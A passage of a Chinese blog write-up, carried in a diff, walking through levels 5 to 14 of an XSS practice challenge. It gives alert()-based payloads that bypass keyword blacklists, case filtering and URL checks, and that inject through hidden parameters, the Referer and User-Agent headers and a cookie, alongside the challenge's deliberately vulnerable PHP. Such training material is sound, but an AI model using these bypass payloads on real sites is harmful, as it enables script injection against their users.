class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>第二个输出点对<code>&lt;&gt;</code>进行了替换，使用事件属性进行构造payload</p>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>构造如下payload</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558096540426.png" alt="1558096540426"></p>
+<p>发现只有script被和谐了， ~ o(<em>￣▽￣</em>)ブ</p>
+<p>使用非<code>&lt;script&gt;</code>的html标签绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed src=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;//</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558098248009.png" alt="1558098248009"></p>
+<p>使用触发事件绕过</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558098351438.png" alt="1558098351438"></p>
+<p>发现on被过滤，大小写也不行，暂没有找到不用on的😂</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>首先使用strtolower()函数把字符串转换为小写，然后对<code>&lt;script</code>和<code>on</code>进行replace替换，那就用不了事件属性了，只能使用闭合标签的方式</p>
+<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>script被过滤</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100639552.png" alt="1558100639552"></p>
+<p>src被过滤</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100187489.png" alt="1558100187489"></p>
+<p>href被过滤</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100233619.png" alt="1558100233619"></p>
+<p>on被过滤，事件属性不行了</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100422464.png" alt="1558100422464"></p>
+<p>有一点点尬住了，看一下源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>没有使用strtolower()函数，可以大小写绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed SRC=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot; Onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558102420262.png" alt="1558102420262"></p>
+<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>试一下事件属性</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105060724.png" alt="1558105060724"></p>
+<p>on没了，被替换为空，接着试一下标签逃逸</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105341248.png" alt="1558105341248"></p>
+<p>src和script也没了</p>
+<p>想到了双写，成功绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed ssrcrc=javasscriptcript:alert(/XSS/);&gt;//</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105662485.png" alt="1558105662485"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>替换了一系列关键字，但是却替换为空值，所以可以利用双写绕过</p>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="属性值编码绕过"><a href="#属性值编码绕过" class="headerlink" title="属性值编码绕过"></a>属性值编码绕过</h3><p>这关有点不一样了</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105893509.png" alt="1558105893509"></p>
+<p>试一下标签逃逸</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558106118797.png" alt="1558106118797"></p>
+<p>script和href被替换，再尝试on、src、<code>&quot;</code> 都会被替换，大小写也无法绕过</p>
+<p>看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>第一处有html实体化转义，无法逃脱出来。第二处先转换大小写，然后黑名单过滤特殊字符和双引号；参考别人的文章，发现可以对HTML属性的值进行实体编码绕过</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558237810579.png" alt="1558237810579"></p>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="格式验证绕过"><a href="#格式验证绕过" class="headerlink" title="格式验证绕过"></a>格式验证绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558248807926.png" alt="1558248807926"></p>
+<p>提示链接不合法，应该是验证了链接的格式，输入<code>http://</code> 能成功写入</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558248919987.png" alt="1558248919987"></p>
+<p>那就继续构造带 <code>http://</code> 的拼接语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)//http://</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558249256987.png" alt="1558249256987"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>可以看出与level8的区别就在于多加了一个链接格式的判断，使用strpos()函数，查找<code>http://</code>出现的位置，但是改代码没有判断位置是否在开头，仅判断被查找的字符串即 <code>http://</code> 是否存在，所以可以在payload后面加上注释符和<code>http://</code>，即可成功绕过</p>
+<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="隐藏GET传参"><a href="#隐藏GET传参" class="headerlink" title="隐藏GET传参"></a>隐藏GET传参</h3><p>这关发现一个隐藏的表单</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558250497766.png" alt="1558250497766"></p>
+<p>但是没有提交按钮和提交页面</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558250601339.png" alt="1558250601339"></p>
+<p>看一下源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>发现GET参数<code>t_sort</code>会被过滤<code>&lt;&gt;</code>输出，所以可以使用事件属性进行构造利用</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251116826.png" alt="1558251116826"></p>
+<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="Referer头插入"><a href="#Referer头插入" class="headerlink" title="Referer头插入"></a>Referer头插入</h3><p>隐藏表单多了一个<code>&lt;input&gt;</code></p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251262671.png" alt="1558251262671"></p>
+<p>把全部表单的值通过GET参数传递过去</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251563250.png" alt="1558251563250"></p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558251601685.png" alt="1558251601685"></p>
+<p>只有t_sort接收了get传参，看起来双引号被转义掉了，尝试了单引号也不行，又尝试了POST传参也不行</p>
+<p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>和上一关的代码类似，但是<code>t_sort</code>的值经过了html实体化转义，所以无法在此处进行利用了。不过新的<code>t_ref</code>，的值是通过referer头获取的，可以抓包修改Referer头的内容，插入payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558252521803.png" alt="1558252521803"></p>
+<p>总结：</p>
+<p>要注意细节，寻找提示信息，不放过任何一处我们提交的数据内容</p>
+<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="UA头插入"><a href="#UA头插入" class="headerlink" title="UA头插入"></a>UA头插入</h3><p>在页面源码中发现User-Agent信息</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558252884442.png" alt="1558252884442"></p>
+<p>修改UA头部信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253045262.png" alt="1558253045262"></p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253074469.png" alt="1558253074469"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>跟上一关一样，区别就在于获取的请求头部信息变成了<code>User-Agent</code>，所以只需要抓包修改UA的内容即可</p>
+<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="Cookie插入"><a href="#Cookie插入" class="headerlink" title="Cookie插入"></a>Cookie插入</h3><p>注意到cookie参数</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253383778.png" alt="1558253383778"></p>
+<p>查看cookie内容</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253574394.png" alt="1558253574394"></p>
+<p>修改cookie，插入payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558253654942.png" alt="1558253654942"></p>
+<p>成功触发XSS</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析：</p>
+<p>跟之前一样，区别就在于获取的请求头部信息换成了获取cookie中的<code>user</code>的值，所以把cookie中user的值里插入payload即可</p>
+<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif xss"></a>exif xss</h3><p>这关使用<code>&lt;iframe&gt;</code>嵌入了一个小网页（注意：需要访问到<code>外网</code>才能访问）</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558254716646.png" alt="1558254716646"></p>
+<p>发现搜索框有输出点</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558254944255.png" alt="1558254944255"></p>
+<p>尝试闭合标签</p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558255107617.png" alt="1558255107617"></p>
+<p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558255149283.png" alt="1558255149283"></p>
+<p>&lt;&gt;被转义掉了，感觉这里不存在可利用的点了。</p>
+<p>看下源码：</p>
